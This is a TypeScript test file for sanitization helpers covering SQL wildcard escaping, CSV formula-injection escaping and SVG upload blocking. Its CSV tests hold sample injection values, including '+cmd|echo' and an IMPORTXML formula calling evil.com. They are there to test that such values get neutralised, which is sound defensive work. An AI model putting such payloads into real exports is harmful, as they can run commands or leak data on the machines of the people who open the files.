/**
 * Tests for input sanitization utilities.
 *
 * EF-M10-005: SQL wildcard escaping
 * EF-M14-004: CSV formula injection prevention
 * EF-M11-004: SVG upload blocking
 */

import { describe, test, expect } from 'bun:test';
import { escapeLikePattern, escapeCsvValue, isBlockedDocumentFile } from './sanitize';

// ─── EF-M10-005: SQL Wildcard Escaping ─────────────────────

describe('escapeLikePattern', () => {
  test('escapes % wildcard character', () => {
    expect(escapeLikePattern('%')).toBe('\\%');
    expect(escapeLikePattern('100%')).toBe('100\\%');
  });

  test('escapes _ wildcard character', () => {
    expect(escapeLikePattern('_')).toBe('\\_');
    expect(escapeLikePattern('test_value')).toBe('test\\_value');
  });

  test('escapes backslash', () => {
    expect(escapeLikePattern('\\')).toBe('\\\\');
  });

  test('escapes multiple wildcards in one string', () => {
    expect(escapeLikePattern('%_test_%')).toBe('\\%\\_test\\_\\%');
  });

  test('leaves normal search terms unchanged', () => {
    expect(escapeLikePattern('CPD Seminar')).toBe('CPD Seminar');
    expect(escapeLikePattern('Dr. Santos')).toBe('Dr. Santos');
    expect(escapeLikePattern('')).toBe('');
  });

  test('handles unicode and special characters', () => {
    expect(escapeLikePattern('José García')).toBe('José García');
    expect(escapeLikePattern('100% done')).toBe('100\\% done');
  });
});

// ─── EF-M14-004: CSV Formula Injection ─────────────────────

describe('escapeCsvValue', () => {
  test('prefixes = with single quote', () => {
    expect(escapeCsvValue('=SUM(A1:A10)')).toBe(`"'=SUM(A1:A10)"`);
  });

  test('prefixes + with single quote', () => {
    expect(escapeCsvValue('+cmd|echo')).toBe(`"'+cmd|echo"`);
  });

  test('prefixes - with single quote', () => {
    expect(escapeCsvValue('-cmd|echo')).toBe(`"'-cmd|echo"`);
  });

  test('prefixes @ with single quote', () => {
    expect(escapeCsvValue('@SUM(A1)')).toBe(`"'@SUM(A1)"`);
  });

  test('prefixes tab with single quote', () => {
    expect(escapeCsvValue('\tcommand')).toBe(`"'\tcommand"`);
  });

  test('prefixes carriage return with single quote', () => {
    expect(escapeCsvValue('\rcommand')).toBe(`"'\rcommand"`);
  });

  test('escapes quotes inside formula-injected values', () => {
    expect(escapeCsvValue('=IMPORTXML("http://evil.com","//a")')).toBe(
      `"'=IMPORTXML(""http://evil.com"",""//a"")"`,
    );
  });

  test('quotes values with commas (non-formula)', () => {
    expect(escapeCsvValue('Metro Manila, NCR')).toBe('"Metro Manila, NCR"');
  });

  test('quotes values with embedded quotes', () => {
    expect(escapeCsvValue('He said "hello"')).toBe('"He said ""hello"""');
  });

  test('quotes values with newlines', () => {
    expect(escapeCsvValue('line1\nline2')).toBe('"line1\nline2"');
  });

  test('leaves normal values unchanged', () => {
    expect(escapeCsvValue('Metro Manila Chapter')).toBe('Metro Manila Chapter');
    expect(escapeCsvValue('45')).toBe('45');
    expect(escapeCsvValue(0.89)).toBe('0.89');
  });

  test('handles null/undefined', () => {
    expect(escapeCsvValue(null)).toBe('');
    expect(escapeCsvValue(undefined)).toBe('');
  });

  test('handles numeric values', () => {
    expect(escapeCsvValue(42)).toBe('42');
    expect(escapeCsvValue(0)).toBe('0');
  });
});

// ─── EF-M11-004: SVG Upload Blocking ──────────────────────

describe('isBlockedDocumentFile', () => {
  test('blocks .svg extension', () => {
    expect(isBlockedDocumentFile('logo.svg')).toBe(true);
  });

  test('blocks .svgz extension', () => {
    expect(isBlockedDocumentFile('icon.svgz')).toBe(true);
  });

  test('blocks case-insensitive .SVG extension', () => {
    expect(isBlockedDocumentFile('LOGO.SVG')).toBe(true);
  });

  test('blocks by MIME type image/svg+xml', () => {
    expect(isBlockedDocumentFile('file.unknown', 'image/svg+xml')).toBe(true);
  });

  test('allows PDF files', () => {
    expect(isBlockedDocumentFile('report.pdf', 'application/pdf')).toBe(false);
  });

  test('allows image files', () => {
    expect(isBlockedDocumentFile('photo.jpg', 'image/jpeg')).toBe(false);
    expect(isBlockedDocumentFile('photo.png', 'image/png')).toBe(false);
  });

  test('allows DOCX files', () => {
    expect(isBlockedDocumentFile('doc.docx')).toBe(false);
  });
});
